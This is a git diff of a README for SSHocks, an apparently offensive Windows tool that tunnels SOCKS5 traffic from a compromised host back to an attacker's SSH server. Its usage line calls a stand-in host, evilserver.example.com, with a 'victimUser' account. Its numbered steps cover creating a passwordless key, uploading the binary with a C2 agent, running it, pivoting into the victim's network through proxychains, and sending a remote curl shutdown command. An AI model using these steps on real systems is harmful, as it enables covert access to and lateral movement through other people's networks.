@@ -6,23 +6,25 @@ The latest release is confirmed to work on Windows 10 hosts. It has not yet been
 
 **USAGE:** SSHocks.exe [SSH server] [SSH Port] [username] [path to private key] [remote socks port]
 
-(Ex. SSHocks.exe evilserver.example.com 2222 victimUser C:\Users\<username>\.ssh\id_rsa 1080)
+(Ex. SSHocks.exe evilserver.example.com 2222 victimUser C:\Path\to\keyfile\id_ed25519 1080)
 
 **NOTES:**
 
-1. You will need to generate a keypair on your SSH server for your victim's user account and create the user account on the SSH server. DO NOT SET A PASSWORD ON THE KEY.
+1. You will need to create the user account on your SSH server. Then, generate an ed25519 keypair on your SSH server for your victim's user account. **DO NOT SET A PASSWORD ON THE KEY.** SSHocks DOES NOT support RSA keys, only ed25519.
 
-2. Upload the key and SSHocks.exe to the victim host using your C2 agent or whatever other means you might have for uploading sketchy stuff.
+2. Upload the key and SSHocks.exe to the victim host using your C2 agent or whatever other means you might have for uploading sketchy stuff. **(At this time, SSHocks cannot be assembly loaded. I'm working on fixing that. Any assistance is appreciated!)**
 
 3. Execute using your prefered binary execution method.
 
 4. By default, the program will open port 1080 on the victim host as the receiving port for all Socks5 traffic. This can be changed in source as needed.
-5. Once the client is connected to your attack SSH server and you've verified the proxy port is listening, you can use any proxy aware program or tool to attack the victim's network. Use Proxychains with non-proxy aware tools. Just make sure your proxychains.conf file is properly configured for the correct port and using socks5.
-6. Since the point was to use this via a C2 impant which is likely to not provide an interactive shell, I baked in a way to gracefully shut the proxy and tunnel down using a remote proxy command. Simply use proxychains or someo ther means to send:
+   
+5. Once the client is connected to your attack SSH server and you've verified the proxy port is listening, you can use any proxy aware program or tool to attack the victim's network. Use Proxychains with non-proxy aware tools. Just make sure your proxychains.conf file is properly configured for the correct port and is using socks5.
+
+6. **SHUT DOWN** Since the point was to use this via a C2 impant which is likely to not provide an interactive shell, I baked in a way to gracefully shut the proxy and tunnel down using a remote proxy command. Simply use proxychains or some other means to send:
   
    *curl xxx.xxx*
    
-The proxy will receive the connection request and interpret it as a command to shutdown and disconnect gracefully.
+The proxy will receive the connection request and interpret it as a command to shutdown, and will disconnect gracefully.
 
 <h2>To Do:</h2>
 - Modify source to be able to be loaded using Assembly Reflection
